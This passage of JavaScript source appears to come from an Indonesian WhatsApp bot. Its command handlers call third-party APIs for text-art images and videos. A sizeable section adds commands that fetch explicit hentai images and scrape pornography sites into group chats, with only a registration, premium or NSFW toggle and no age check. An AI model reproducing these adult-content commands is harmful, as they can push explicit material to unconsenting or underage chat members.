                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} zaki&chan*`)
                   var F = body.slice(10)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]; 
                   reply (mess.wait)
                   anu = await getBuffer(`https://api.zeks.xyz/api/phub?apikey=${apizeks}&img=https://1.bp.blogspot.com/-x8KhcOBG-yw/XiU4pi1yWVI/AAAAAAAADBA/gK8tsLyc1lQ808A348IKzDCjf6fUBKONwCLcBGAsYHQ/s1600/cara%2Bbuat%2Bfoto%2Bprofil%2Bdi%2Bwhatsapp%2Bmenjadi%2Bunik.jpg&username=${F1}&msg=${F2}`)
                   zaki.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break                                                  
                   case 'nulis':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} zaki*`)
                   F = body.slice(7)
                   reply (mess.wait)
                   anu = await getBuffer(`https://api.zeks.xyz/api/nulis?text=${F}&apikey=${apizeks}`)
                   zaki.sendMessage(from, anu, image, {caption: `nihh kack`, quoted: mek})
                   break                                                  
                   case 'shortener':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command}https://link*`)
                   F = body.slice(11)
                   reply (mess.wait)                   
                   anu = await fetchJson(`https://api.zeks.xyz/api/sid-shortener?apikey=${apizeks}&url=${F}`)
                   anu1 = `➻ *SHORT* : ${anu.short}\n`
                   anu1 += `➻ *LONG* : ${anu.long}\n`
                   anu1 += `➻ *DATE* : ${anu.created_at.date}\n`
                   anu1 += `➻ *TYPE* : ${anu.created_at.timezone_type}\n`
                   anu1 += `➻ *ZONA* : ${anu.created_at.timezone}\n`
                   reply(anu1)
                   break                                                   
                   case 'urlshort':  
                   if (!isRegister) return reply(mess.only.daftarB)	
		            
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command}https://link*`)
                   F = body.slice(10)
                   reply (mess.wait)                                      
                   anu = await fetchJson(`https://api.zeks.xyz/api/urlshort-all?apikey=${apizeks}&url=${F}`)
                   anu1 = `➻ *SATU* : ${anu.result_1}\n`
                   anu1 += `➻ *DUA* : ${anu.result_2}\n`
                   anu1 += `➻ *TIGA* : ${anu.result_3}\n`
                   reply(anu1)
                   break                                                  
 case '8bit':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} kamu&aku*`)
                   reply (mess.wait)
                   var F = body.slice(6)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/8bit/?text1=${F1}&text2=${F2}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                  
                   case 'googlequery':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} kamu & aku & dia*`)
                   reply (mess.wait)
                   var F = body.slice(8)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]
                   var F3 = F.split("&")[2] 
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/gsuggest/?text1=${F1}&text2=${F2}&text3=${F3}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                   
                   case 'fire':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply (mess.wait)
                   F = body.slice(6)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/crossfirelogo/?text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                   
                   case 'burn':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply (mess.wait)
                   F = body.slice(6)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/burnpaper/?text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                   
                   case 'battle':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot & whatsapp*`)
                   reply (mess.wait)
                   var F = body.slice(8)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/bf4/?text1=${F1}&text2=${F2}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                   
                   case 'mug':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply (mess.wait)
                   F = body.slice(5)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/candlemug/?text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                   
                    case 'love':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply (mess.wait)
                   F = body.slice(6)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/lovemsg/?text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek}) 
                   break                                                   
                   case 'mug1':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply (mess.wait)
                   F = body.slice(6)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/mugflower?text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek}) 
                   break                                                   
                   case 'naruto':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply (mess.wait)
                   F = body.slice(8)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/narutobanner?text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek}) 
                   break                                                   
                   case 'glass':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply (mess.wait)
                   F = body.slice(7)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/paperonglass?text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek}) 
                   break                                                   
                   case 'romance':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply (mess.wait)
                   F = body.slice(9)				    
                   anu = await getBuffer(`hthttps://videfikri.com/api/textmaker/romancetext?text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek}) 
                   break                                                   
                   case 'shadow':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply (mess.wait)
                   F = body.slice(8)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/shadowtext?text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                   
                    case 'tiktoknowm':  
                    if (!isRegister) return reply(mess.only.daftarB)	
                    reply(mess.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
                    ini_url = args[0]
                    ini_url = `http://api.lolhuman.xyz/api/tiktok?apikey=${lolKey}&url=${ini_url}`
                    get_result = await fetchJson(ini_url)
                    ini_buffer = await getBuffer(get_result.result.link)
                    zaki.sendMessage(from, ini_buffer, video, { quoted: mek})
                    break                                                  
                    case 'tiktokmusic':  
                    if (!isRegister) return reply(mess.only.daftarB)	 
		            if (!isPrem) return reply(mess.only.premium)
                    reply(mess.wait) 
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
                    ini_link = args[0]
                    get_audio = await getBuffer(`http://api.lolhuman.xyz/api/tiktokmusic?apikey=${lolKey}&url=${ini_link}`)
                    zaki.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, quoted: mek})
                    break                                                  
                    case 'telesticker':  
                    if (!isRegister) return reply(mess.only.daftarB)	
		            if (!isPrem) return reply(mess.only.premium) 
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`http://api.lolhuman.xyz/api/telestick?apikey=${lolKey}&url=${ini_url}`)
                    ini_sticker = ini_url.result.sticker
                    for (sticker_ in ini_sticker) {
                    ini_buffer = await getBuffer(ini_sticker[sticker_])
                    zaki.sendMessage(from, ini_buffer, sticker)
                    }
                    break                                                  
                   case 'tiktokeffect':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot & whatsapp*`)
                   reply (mess.wait)
                   var F = body.slice(8)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/tiktokeffect?text1=${F1}&text2=${F2}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                  
                   case 'coffe':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply (mess.wait)
                   F = body.slice(7)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/coffeecup?text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                    
                   case 'coffe1':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply (mess.wait)
                   F = body.slice(8)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/coffeecup2?text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                  
                  
                   case 'pubg':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot & whatsapp*`)
                   reply (mess.wait)
                   var F = body.slice(6)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/pubgmlogo?text1=${F1}&text2=${F2}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                  

                   case 'water':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply (mess.wait)
                   F = body.slice(7)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/underwater?text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                   
                   case 'silk':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot & whatsapp*`)
                   reply (mess.wait)
                   var F = body.slice(6)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1]				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/silk?text1=${F1}&text2=${F2}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                  
                   case 'potter':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply (mess.wait)
                   F = body.slice(8)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/hpotter?text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                  
                   case 'candy':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply (mess.wait)
                   F = body.slice(7)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/sweetcandy?text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                                       
                   case 'block':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply (mess.wait)
                   F = body.slice(7)				    
                   anu = await getBuffer(`https://videfikri.com/api/textmaker/woodblock?text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                  
 case 'nulis1':  
                    if (!isRegister) return reply(mess.only.daftarB)
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} nama & kelas & nulis*`)
                    var F = body.slice(8)
			        var F1 = F.split("&")[0];
			 	    var F2 = F.split("&")[1]; 
			 	    var F3 = F.split("&")[2]; 
                    reply (mess.wait)
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis?nama=${F1}&kelas=${F2}&text=${F3}&APIKEY=${apixteam}`)
                    zaki.sendMessage(from, anu, image, {caption: `nih kak`, quoted: mek})
                    break                                                  
                    case 'nulis2':  
                    if (!isRegister) return reply(mess.only.daftarB)
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                    reply (mess.wait) 
                    F = body.slice(8)              			    
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis2?text=${F}&APIKEY=${apixteam}`)
                    zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek}) 
                    break                                                   
                    case 'nulis3':  
                    if (!isRegister) return reply(mess.only.daftarB)
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                    reply (mess.wait) 
                    F = body.slice(8)              			    
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis3?text=${F}&APIKEY=${apixteam}`)
                    zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek}) 
                    break                                                   
                    case 'nulis4':  
                    if (!isRegister) return reply(mess.only.daftarB)
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                    reply (mess.wait) 
                    F = body.slice(8)              			    
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis?text=${F}&APIKEY=${apixteam}`)
                    zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek}) 
                    break                                                   
                    case 'nulis5':  
                    if (!isRegister) return reply(mess.only.daftarB)
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                    reply (mess.wait) 
                    F = body.slice(8)              			    
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis5?text=${F}&APIKEY=${apixteam}`)
                    zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek}) 
                    break                                                   
                    case 'nulis6':  
                    if (!isRegister) return reply(mess.only.daftarB)
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                    reply (mess.wait) 
                    F = body.slice(8)              			    
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis6?text=${F}&APIKEY=${apixteam}`)
                    zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek}) 
                    break                                                                       
                    case 'video1':  
                    if (!isRegister) return reply(mess.only.daftarB)
		            
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                    reply (mess.wait) 
                    F = body.slice(8)              			    
                    anu = await getBuffer(`https://api.xteam.xyz/videomaker/poly?text=${F}&APIKEY=${apixteam}`)
                    zaki.sendMessage(from, anu, video, {caption: `Nihh kack`, quoted: mek}) 
                    break                                                  
                    case 'video2':  
                    if (!isRegister) return reply(mess.only.daftarB)
		            
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                    reply (mess.wait) 
                    F = body.slice(8)              			    
                    anu = await getBuffer(`https://api.xteam.xyz/videomaker/bold?text=${F}&APIKEY=${apixteam}`)
                    zaki.sendMessage(from, anu, video, {caption: `Nihh kack`, quoted: mek}) 
                    break                                                  
                    case 'video3':  
                    if (!isRegister) return reply(mess.only.daftarB)
		            
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                    reply (mess.wait) 
                    F = body.slice(8)              			    
                    anu = await getBuffer(`https://api.xteam.xyz/videomaker/glowing?text=${F}&APIKEY=${apixteam}`)
                    zaki.sendMessage(from, anu, video, {caption: `Nihh kack`, quoted: mek}) 
                    break                                                  
                    case 'video4':  
                    if (!isRegister) return reply(mess.only.daftarB)
		            
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                    reply (mess.wait) 
                    F = body.slice(8)              			    
                    anu = await getBuffer(`https://api.xteam.xyz/videomaker/colorful?text=${F}&APIKEY=${apixteam}`)
                    zaki.sendMessage(from, anu, video, {caption: `Nihh kack`, quoted: mek}) 
                    break                                                  
                    case 'video5':  
                    if (!isRegister) return reply(mess.only.daftarB)
		            
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                    reply (mess.wait) 
                    F = body.slice(8)              			    
                    anu = await getBuffer(`https://api.xteam.xyz/videomaker/army?text=${F}&APIKEY=${apixteam}`)
                    zaki.sendMessage(from, anu, video, {caption: `Nihh kack`, quoted: mek}) 
                    break                                                  
                    case 'video6':  
                    if (!isRegister) return reply(mess.only.daftarB)
		            
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                    reply (mess.wait) 
                    F = body.slice(8)              			    
                    anu = await getBuffer(`https://api.xteam.xyz/videomaker/retro?text=${F}&APIKEY=${apixteam}`)
                    zaki.sendMessage(from, anu, video, {caption: `Nihh kack`, quoted: mek}) 
                    break                                                  
case 'chiisaihentai':
      case 'trap':
      case 'blowjob':
      case 'yaoi':
      case 'ecchi':
      case 'hentai':
      case 'ahegao':
      case 'hololewd':
      case 'sideoppai':
      case 'animefeets':
      case 'animebooty':
      case 'animethighss':
      case 'hentaiparadise':
      case 'animearmpits':
      case 'hentaifemdom':
      case 'lewdanimegirls':
      case 'biganimetiddies':
      case 'animebellybutton':
      case 'hentai4everyone':
        if (!isRegister) return reply(mess.only.daftarB)
        if (isLimit(sender)) return reply(ind.limitend(pushname))
        if (!isNsfw) return reply('*NSFW MATI*')
        
        await limitAdd(sender)
        await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lolKey}`).then((gambar) => {
          zaki.sendMessage(from, gambar, image, {
            quoted: mek,
            caption: 'Nih Senpai...\n*Support HLX Bot Dengan Follow & Subscribe :*\nInstagram.com/ahmadzaki_yo'
          })
        })
        break                                                  
      case 'bj':
      case 'ero':
      case 'cum':
      case 'feet':
      case 'yuri':
      case 'trap':
      case 'lewd':
      case 'feed':
      case 'eron':
      case 'solo':
      case 'gasm':
      case 'poke':
      case 'anal':
      case 'holo':
      case 'tits':
      case 'kuni':
      case 'kiss':
      case 'erok':
      case 'smug':
      case 'baka':
      case 'solog':
      case 'feetg':
      case 'lewdk':
      case 'waifu':
      case 'pussy':
      case 'femdom':
      case 'cuddle':
      case 'hentai':
      case 'eroyuri':
      case 'cum_jpg':
      case 'blowjob':
      case 'erofeet':
      case 'holoero':
      case 'classic':
      case 'erokemo':
      case 'fox_girl':
      case 'futanari':
      case 'lewdkemo':
      case 'wallpaper':
      case 'pussy_jpg':
      case 'kemonomimi':
      case 'nsfw_avatar':
        if (!isRegister) return reply(mess.only.daftarB)
        if (isLimit(sender)) return reply(ind.limitend(pushname))
        if (!isNsfw) return reply('*NSFW MATI*')
        
        await limitAdd(sender)
        getBuffer(`https://api.lolhuman.xyz/api/random2/${command}?apikey=${lolKey}`).then((gambar) => {
          zaki.sendMessage(from, gambar, image, {
            quoted: mek,
            caption: 'Nih Senpai...\n*Support HLX Bot Dengan Follow & Subscribe :*\nInstagram.com/ahmadzaki_yo'
          })
        })
        break                                                  
             case 'ngif':
             case 'nsfw_neko_gif':
             case 'random_hentai_gif':
             if (!isNsfw) return reply('*NSFW MATI*')
             if (isLimit(sender)) return reply(ind.limitend(pushname))
			      	reply(ind.wait)
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `http://api.lolhuman.xyz/api/random2/${command}?apikey=${lolKey}`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        zaki.sendMessage(from, buff, sticker, { quoted: mek })
                        fs.unlinkSync(rano)
                    })
                    break                                                  
case 'xnxx':
        if (!isRegister) return reply(mess.only.daftarB)	
        if (isLimit(sender)) return reply(ind.limitend(pushname))
        
        if (!isPrem) return reply(mess.only.premium)
        reply(ind.wait)
        if (args.length == 0) return reply(`Example: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)
        query = args.join(" ")
        get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxx?apikey=${lolKey}&url=${query}`)
        get_result = get_result.result
        ini_txt = `Title : ${get_result.title}\n`
        ini_txt += `Duration : ${get_result.duration}\n`
        ini_txt += `View : ${get_result.view}\n`
        ini_txt += `Rating : ${get_result.rating}\n`
        ini_txt += `Like : ${get_result.like}\n`
        ini_txt += `Dislike : ${get_result.dislike}\n`
        ini_txt += `Comment : ${get_result.comment}\n`
        ini_txt += `Tag : ${get_result.tag.join(", ")}\n`
        ini_txt += `Description : ${get_result.description}\n`
        ini_txt += "Link : \n"
        ini_link = get_result.link
        for (var x of ini_link) {
          ini_txt += `${x.type} - ${x.link}\n\n`
        }
        thumbnail = await getBuffer(get_result.thumbnail)
        await zaki.sendMessage(from, thumbnail, image, {
          quoted: mek,
          caption: ini_txt
        })
        break                                                  
      case 'xnxxsearch':
      case 'xnxxs':
        if (!isRegister) return reply(mess.only.daftarB)	
        if (isLimit(sender)) return reply(ind.limitend(pushname))
        if (!isPrem) return reply(mess.only.premium)
        reply(ind.wait)
        if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
        query = args.join(" ")
        get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=${lolKey}&query=${query}`)
        get_result = get_result.result
        ini_txt = ""
        for (var x of get_result) {
          ini_txt += `Title : ${x.title}\n`
          ini_txt += `Views : ${x.views}\n`
          ini_txt += `Duration : ${x.duration}\n`
          ini_txt += `Uploader : ${x.uploader}\n`
          ini_txt += `Link : ${x.link}\n`
          ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
        }
        reply(ini_txt)
        break                                                  
      case 'xhamster':
        if (!isRegister) return reply(mess.only.daftarB)	
        if (isLimit(sender)) return reply(ind.limitend(pushname))
        
        if (!isPrem) return reply(mess.only.premium)
        reply(ind.wait)
        if (args.length == 0) return reply(`Example: ${prefix + command} https://xhamster.com/videos/party-with-friends-end-in-awesome-fucking-5798407`)
        query = args.join(" ")
        get_result = await fetchJson(`https://api.lolhuman.xyz/api/xhamster?apikey=${lolKey}&url=${query}`)
        get_result = get_result.result
        ini_txt = `Title : ${get_result.title}\n`
        ini_txt += `Duration : ${get_result.duration}\n`
        ini_txt += `Uploader : ${get_result.author}\n`
        ini_txt += `Upload : ${get_result.upload}\n`
        ini_txt += `View : ${get_result.views}\n`
        ini_txt += `Rating : ${get_result.rating}\n`
        ini_txt += `Like : ${get_result.likes}\n`
        ini_txt += `Dislike : ${get_result.dislikes}\n`
        ini_txt += `Comment : ${get_result.comments}\n`
        ini_txt += "Link : \n"
        link = get_result.link
        for (var x of link) {
          ini_txt += `${x.type} - ${x.link}\n\n`
        }
        thumbnail = await getBuffer(get_result.thumbnail)
        await zaki.sendMessage(from, thumbnail, image, {
          quoted: mek,
          caption: ini_txt
        })
        break                                                  
      case 'nhentai':
        if (!isRegister) return reply(mess.only.daftarB)	
        if (isLimit(sender)) return reply(ind.limitend(pushname))
        
        if (!isPrem) return reply(mess.only.premium)
        reply(ind.wait)
        if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
        henid = args[0]
        get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${lolKey}`)
        get_result = get_result.result
        ini_txt = `Title Romaji : ${get_result.title_romaji}\n`
        ini_txt += `Title Native : ${get_result.title_native}\n`
        ini_txt += `Read Online : ${get_result.read}\n`
        get_info = get_result.info
        ini_txt += `Parodies : ${get_info.parodies}\n`
        ini_txt += `Character : ${get_info.characters.join(", ")}\n`
        ini_txt += `Tags : ${get_info.tags.join(", ")}\n`
        ini_txt += `Artist : ${get_info.artists}\n`
        ini_txt += `Group : ${get_info.groups}\n`
        ini_txt += `Languager : ${get_info.languages.join(", ")}\n`
        ini_txt += `Categories : ${get_info.categories}\n`
        ini_txt += `Pages : ${get_info.pages}\n`
        ini_txt += `Uploaded : ${get_info.uploaded}\n`
        reply(ini_txt)
        break                                                  
      case 'nhentaipdf':
        if (!isRegister) return reply(mess.only.daftarB)	
        if (isLimit(sender)) return reply(ind.limitend(pushname))
        
        if (!isPrem) return reply(mess.only.premium)
        reply(ind.wait)
        if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
        henid = args[0]
        get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=${lolKey}`)
        get_result = get_result.result
        ini_buffer = await getBuffer(get_result)
        await zaki.sendMessage(from, ini_buffer, document, {
          quoted: mek,
          mimetype: Mimetype.pdf,
          filename: `${henid}.pdf`
        })
        break                                                  
      case 'nekopoi':
        if (!isRegister) return reply(mess.only.daftarB)	
        if (isLimit(sender)) return reply(ind.limitend(pushname))
        
        if (!isPrem) return reply(mess.only.premium)
        reply(ind.wait)
        if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/isekai-harem-monogatari-episode-4-subtitle-indonesia/`)
        ini_url = args[0]
        get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoi?apikey=${lolKey}&url=${ini_url}`)
        get_result = get_result.result
        ini_txt = `Title : ${get_result.anime}\n`
        ini_txt += `Porducers : ${get_result.producers}\n`
        ini_txt += `Duration : ${get_result.duration}\n`
        ini_txt += `Size : ${get_result.size}\n`
        ini_txt += `Sinopsis : ${get_result.sinopsis}\n`
        link = get_result.link
        for (var x in link) {
          ini_txt += `\n${link[x].name}\n`
          link_dl = link[x].link
          for (var y in link_dl) {
            ini_txt += `${y} - ${link_dl[y]}\n`
          }
        }
        ini_buffer = await getBuffer(get_result.thumb)
        await zaki.sendMessage(from, ini_buffer, image, {
          quoted: mek,
          caption: ini_txt
        })
        break                                                  
      case 'nekopoisearch':
      case 'nekopois':
        if (!isRegister) return reply(mess.only.daftarB)	
        if (isLimit(sender)) return reply(ind.limitend(pushname))
        
        if (!isPrem) return reply(mess.only.premium)
        reply(ind.wait)
        if (args.length == 0) return reply(`Example: ${prefix + command} Isekai Harem`)
        query = args.join(" ")
        get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoisearch?apikey=${lolKey}&query=${query}`)
        get_result = get_result.result
        ini_txt = ""
        for (var x of get_result) {
          ini_txt += `Title : ${x.title}\n`
          ini_txt += `Link : ${x.link}\n`
          ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
        }
        reply(ini_txt)
        break                                                  
      case 'pornhubsearch':
      case 'pornhubs':
        if (!isRegister) return reply(mess.only.daftarB)	
        if (isLimit(sender)) return reply(ind.limitend(pushname))
        
        if (!isPrem) return reply(mess.only.premium)
        reply(ind.wait)
        if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
        ini_cari = body.slice(12)
        hans = await fetchJson(`https://api.lolhuman.xyz/api/pornhubsearch?apikey=${lolKey}&query=${ini_cari}`)
        teks = ' \n\n─────────────────────────\n\n'
        for (let i of hans.result) {
          teks += `*Title :* ${i.title}\n*Link :* ${i.link}\n*Image :* ${i.thumbnail}\n*Duration :* ${i.duration}\n*Uploder :* ${i.uploader}\n*Views :* ${i.views}\n*Rating :* ${i.rating}\n*Upload Time :* ${i.added} \n\n─────────────────────────\n\n`
        }
        reply(teks.trim())
        await limitAdd(sender)
        break                                                  
case 'neon1':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply (mess.wait)
                   F = body.slice(7)				    
                   anu = await getBuffer(`https://docs-jojo.herokuapp.com/api/neon_light?text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                    
                   case 'text3d':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply (mess.wait)
                   F = body.slice(8)				    
                   anu = await getBuffer(`https://docs-jojo.herokuapp.com/api/text3d?text=${F}`)
                   zaki.sendMessage(from, anu, image, {caption: `Nihh kack`, quoted: mek})
                   break                                                                     
                   case 'galaxy':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`)
                   reply (mess.wait)
                   F = body.slice(8)				    
